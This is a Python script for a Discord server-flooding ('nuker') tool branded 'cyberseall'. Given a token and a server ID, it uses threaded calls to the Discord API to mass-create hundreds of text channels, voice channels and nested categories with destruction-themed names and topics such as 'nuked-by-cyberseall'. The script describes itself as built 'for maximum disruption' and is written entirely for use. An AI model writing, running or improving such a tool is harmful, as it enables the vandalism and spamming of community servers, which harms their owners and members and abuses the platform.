

import requests
import time
import json
import random
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import inquirer

def rgb(r, g, b):
    return f'\033[38;2;{r};{g};{b}m'

RESET = '\033[0m'

def pretty_print(text, color=(255,64,64)):
    ansi = rgb(*color)
    print(ansi + text + RESET)

def get_headers(token):
    return {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }

CHANNEL_NAMES = [
    "💀-nuked-by-cyberseall-💀",
    "🔥-server-destroyed-🔥",
    "⚡-chaos-channel-⚡",
    "💥-boom-boom-boom-💥",
    "🌪️-tornado-of-destruction-🌪️",
    "🎯-target-eliminated-🎯",
    "🚀-rocket-to-chaos-🚀",
    "⭐-star-destroyer-⭐",
    "🌈-rainbow-of-doom-🌈",
    "💎-diamond-chaos-💎",
    "🔮-mystic-destruction-🔮",
    "🎪-circus-of-chaos-🎪",
    "🎲-dice-of-doom-🎲",
    "🎨-art-of-destruction-🎨",
    "🎵-music-of-chaos-🎵",
    "🎮-game-over-🎮",
    "📱-phone-home-📱",
    "💻-computer-virus-💻",
    "🖥️-system-crash-🖥️",
    "⌨️-keyboard-warrior-⌨️"
]

CHAOS_TOPICS = [
    "This server has been completely destroyed by cyberseall",
    "Welcome to the chaos dimension",
    "All your channels are belong to us",
    "Resistance is futile",
    "The chaos has begun",
    "Server.exe has stopped working",
    "404 - Server not found",
    "System overload detected",
    "Chaos protocol activated",
    "Destruction sequence initiated"
]

def create_text_channel(token, guild_id, name, topic=None, category_id=None):
    headers = get_headers(token)
    
    channel_data = {
        'name': name,
        'type': 0,
    }
    
    if topic:
        channel_data['topic'] = topic
    
    if category_id:
        channel_data['parent_id'] = category_id
    
    try:
        response = requests.post(
            f'https://discord.com/api/v9/guilds/{guild_id}/channels',
            headers=headers,
            json=channel_data
        )
        if response.status_code == 201:
            channel = response.json()
            pretty_print(f"✅ Created text channel: {channel['name']}", (0,255,0))
            return channel
        else:
            pretty_print(f"❌ Failed to create channel {name}: {response.status_code}", (255,0,0))
            return None
    except Exception as e:
        pretty_print(f"❌ Error creating channel {name}: {str(e)}", (255,0,0))
        return None

def create_voice_channel(token, guild_id, name, category_id=None):
    headers = get_headers(token)
    
    channel_data = {
        'name': name,
        'type': 2,
    }
    
    if category_id:
        channel_data['parent_id'] = category_id
    
    try:
        response = requests.post(
            f'https://discord.com/api/v9/guilds/{guild_id}/channels',
            headers=headers,
            json=channel_data
        )
        if response.status_code == 201:
            channel = response.json()
            pretty_print(f"✅ Created voice channel: {channel['name']}", (0,255,0))
            return channel
        else:
            pretty_print(f"❌ Failed to create voice channel {name}: {response.status_code}", (255,0,0))
            return None
    except Exception as e:
        pretty_print(f"❌ Error creating voice channel {name}: {str(e)}", (255,0,0))
        return None

def create_category(token, guild_id, name):
    headers = get_headers(token)
    
    category_data = {
        'name': name,
        'type': 4,
    }
    
    try:
        response = requests.post(
            f'https://discord.com/api/v9/guilds/{guild_id}/channels',
            headers=headers,
            json=category_data
        )
        if response.status_code == 201:
            category = response.json()
            pretty_print(f"✅ Created category: {category['name']}", (0,255,0))
            return category
        else:
            pretty_print(f"❌ Failed to create category {name}: {response.status_code}", (255,0,0))
            return None
    except Exception as e:
        pretty_print(f"❌ Error creating category {name}: {str(e)}", (255,0,0))
        return None

def mass_create_channels(token, guild_id, count, channel_type="text"):
    pretty_print(f"📁 Creating {count} {channel_type} channels...", (255,128,0))
    
    created_count = 0
    failed_count = 0
    
    def create_channel_worker(i):
        base_name = random.choice(CHANNEL_NAMES)
        name = f"{base_name}-{i:03d}"
        
        if channel_type == "text":
            topic = random.choice(CHAOS_TOPICS)
            channel = create_text_channel(token, guild_id, name, topic)
        elif channel_type == "voice":
            channel = create_voice_channel(token, guild_id, name)
        else:
            return 0, 1
        
        if channel:
            return 1, 0
        else:
            return 0, 1
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(create_channel_worker, i) for i in range(count)]
        for future in as_completed(futures):
            created, failed = future.result()
            created_count += created
            failed_count += failed
            time.sleep(0.5)
    
    pretty_print(f"📁 Channel creation completed: {created_count} created, {failed_count} failed", (255,255,0))
    return created_count, failed_count

def create_organized_chaos(token, guild_id):
    pretty_print("🗂️ Creating organized chaos structure...", (255,128,0))
    
    chaos_categories = [
        "💀 DESTRUCTION ZONE 💀",
        "🔥 FIRE DEPARTMENT 🔥",
        "⚡ ELECTRIC STORM ⚡",
        "💥 EXPLOSION AREA 💥",
        "🌪️ TORNADO ALLEY 🌪️",
        "🎯 TARGET PRACTICE 🎯",
        "🚀 ROCKET LAUNCH 🚀",
        "⭐ STAR WARS ⭐",
        "🌈 RAINBOW CHAOS 🌈",
        "💎 DIAMOND MINE 💎"
    ]
    
    created_categories = []
    
    for cat_name in chaos_categories:
        category = create_category(token, guild_id, cat_name)
        if category:
            created_categories.append(category)
            
            for i in range(5):
                text_name = f"{random.choice(CHANNEL_NAMES)}-{i:02d}"
                voice_name = f"🔊-voice-chaos-{i:02d}"
                
                create_text_channel(token, guild_id, text_name, random.choice(CHAOS_TOPICS), category['id'])
                time.sleep(0.5)
                create_voice_channel(token, guild_id, voice_name, category['id'])
                time.sleep(0.5)
        
        time.sleep(1)
    
    pretty_print(f"🗂️ Created {len(created_categories)} categories with organized chaos", (255,255,0))
    return len(created_categories)

def spam_channel_names(token, guild_id, count=50):
    pretty_print(f"📛 Creating {count} spam channels with random names...", (255,128,0))
    
    spam_patterns = [
        lambda i: "💀" * (i % 10 + 1),
        lambda i: "🔥" * (i % 15 + 1),
        lambda i: "⚡" * (i % 8 + 1),
        lambda i: f"SPAM-{i:04d}-CHAOS",
        lambda i: f"CHANNEL-{random.randint(1000, 9999)}",
        lambda i: "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ", k=20)),
        lambda i: f"💥-BOOM-{i:03d}-💥",
        lambda i: f"🌪️-TORNADO-{i:03d}-🌪️",
        lambda i: f"🎯-TARGET-{i:03d}-🎯",
        lambda i: f"🚀-ROCKET-{i:03d}-🚀"
    ]
    
    created_count = 0
    
    def create_spam_worker(i):
        pattern = random.choice(spam_patterns)
        name = pattern(i)
        topic = random.choice(CHAOS_TOPICS)
        
        if create_text_channel(token, guild_id, name, topic):
            return 1
        return 0
    
    with ThreadPoolExecutor(max_workers=8) as executor:
        futures = [executor.submit(create_spam_worker, i) for i in range(count)]
        for future in as_completed(futures):
            created_count += future.result()
            time.sleep(0.3)
    
    pretty_print(f"📛 Created {created_count}/{count} spam channels", (255,255,0))
    return created_count

def create_nested_categories(token, guild_id, depth=3):
    pretty_print(f"🗂️ Creating nested category structure (depth: {depth})...", (255,128,0))
    
    base_categories = [
        "💀 LEVEL 1 DESTRUCTION 💀",
        "🔥 LEVEL 1 FIRE 🔥",
        "⚡ LEVEL 1 ELECTRIC ⚡"
    ]
    
    created_count = 0
    
    for base_name in base_categories:
        parent_category = create_category(token, guild_id, base_name)
        if parent_category:
            created_count += 1
            
            for level in range(2, depth + 1):
                for sub in range(3):
                    sub_name = f"📁 LEVEL {level} SUB {sub+1} 📁"
                    sub_category = create_category(token, guild_id, sub_name)
                    if sub_category:
                        created_count += 1
                        
                        for ch in range(2):
                            channel_name = f"chaos-level-{level}-{sub+1}-{ch+1}"
                            create_text_channel(token, guild_id, channel_name, "Nested chaos channel", sub_category['id'])
                            time.sleep(0.5)
                    
                    time.sleep(1)
        
        time.sleep(2)
    
    pretty_print(f"🗂️ Created {created_count} nested categories", (255,255,0))
    return created_count

def run_channel_flood():
    pretty_print("📁 CHANNEL FLOOD - MASS CREATION TOOL 📁", (255,0,0))
    pretty_print("Creates hundreds of channels for maximum disruption", (255,128,0))
    
    token = input("\n🔑 Enter Discord token: ").strip()
    if not token:
        pretty_print("❌ No token provided!", (255,0,0))
        return
    
    guild_id = input("🏠 Enter Server ID: ").strip()
    if not guild_id:
        pretty_print("❌ No server ID provided!", (255,0,0))
        return
    
    while True:
        pretty_print("\n📁 Channel Flood Options:", (255,128,0))
        questions = [
            inquirer.List('action',
                         message="Select flood type:",
                         choices=[
                             '📝 Mass Create Text Channels',
                             '🔊 Mass Create Voice Channels',
                             '🗂️ Create Organized Chaos',
                             '📛 Spam Channel Names',
                             '🗂️ Create Nested Categories',
                             '💥 ULTIMATE CHANNEL FLOOD',
                             '🚪 Back to Main Menu'
                         ]),
        ]
        answers = inquirer.prompt(questions)
        if not answers:
            break
        
        action = answers['action']
        
        if action == '🚪 Back to Main Menu':
            break
        
        if action == '📝 Mass Create Text Channels':
            count = input("Enter number of text channels to create (1-500): ").strip()
            try:
                count = int(count)
                if 1 <= count <= 500:
                    mass_create_channels(token, guild_id, count, "text")
                else:
                    pretty_print("❌ Invalid count (1-500)", (255,0,0))
            except ValueError:
                pretty_print("❌ Invalid number", (255,0,0))
        
        elif action == '🔊 Mass Create Voice Channels':
            count = input("Enter number of voice channels to create (1-200): ").strip()
            try:
                count = int(count)
                if 1 <= count <= 200:
                    mass_create_channels(token, guild_id, count, "voice")
                else:
                    pretty_print("❌ Invalid count (1-200)", (255,0,0))
            except ValueError:
                pretty_print("❌ Invalid number", (255,0,0))
        
        elif action == '🗂️ Create Organized Chaos':
            pretty_print("⚠️ This will create 10 categories with 100 channels!", (255,255,0))
            confirm = input("Type 'ORGANIZE' to confirm: ").strip()
            if confirm == 'ORGANIZE':
                create_organized_chaos(token, guild_id)
            else:
                pretty_print("❌ Operation cancelled", (255,255,0))
        
        elif action == '📛 Spam Channel Names':
            count = input("Enter number of spam channels (1-100): ").strip()
            try:
                count = int(count)
                if 1 <= count <= 100:
                    spam_channel_names(token, guild_id, count)
                else:
                    pretty_print("❌ Invalid count (1-100)", (255,0,0))
            except ValueError:
                pretty_print("❌ Invalid number", (255,0,0))
        
        elif action == '🗂️ Create Nested Categories':
            depth = input("Enter nesting depth (1-5): ").strip()
            try:
                depth = int(depth)
                if 1 <= depth <= 5:
                    create_nested_categories(token, guild_id, depth)
                else:
                    pretty_print("❌ Invalid depth (1-5)", (255,0,0))
            except ValueError:
                pretty_print("❌ Invalid number", (255,0,0))
        
        elif action == '💥 ULTIMATE CHANNEL FLOOD':
            pretty_print("💥 ULTIMATE FLOOD - MAXIMUM CHANNEL CREATION!", (255,0,0))
            pretty_print("⚠️ This will create 500+ channels and categories!", (255,255,0))
            
            confirm1 = input("Type 'FLOOD' to confirm: ").strip()
            if confirm1 != 'FLOOD':
                pretty_print("❌ Operation cancelled", (255,255,0))
                continue
            
            confirm2 = input("Type 'CHAOS' to proceed: ").strip()
            if confirm2 != 'CHAOS':
                pretty_print("❌ Operation cancelled", (255,255,0))
                continue
            
            pretty_print("\n💥 INITIATING ULTIMATE CHANNEL FLOOD...", (255,0,0))
            time.sleep(2)
            
            pretty_print("🚀 Phase 1: Mass Text Channels", (255,128,0))
            mass_create_channels(token, guild_id, 200, "text")
            
            pretty_print("🚀 Phase 2: Mass Voice Channels", (255,128,0))
            mass_create_channels(token, guild_id, 100, "voice")
            
            pretty_print("🚀 Phase 3: Organized Chaos", (255,128,0))
            create_organized_chaos(token, guild_id)
            
            pretty_print("🚀 Phase 4: Spam Names", (255,128,0))
            spam_channel_names(token, guild_id, 100)
            
            pretty_print("🚀 Phase 5: Nested Categories", (255,128,0))
            create_nested_categories(token, guild_id, 4)
            
            pretty_print("\n💥 ULTIMATE CHANNEL FLOOD COMPLETED! 💥", (255,0,0))
            pretty_print("📁 Server flooded with 500+ channels!", (255,255,0))
        
        input("\nPress Enter to continue...")

if __name__ == "__main__":
    run_channel_flood() 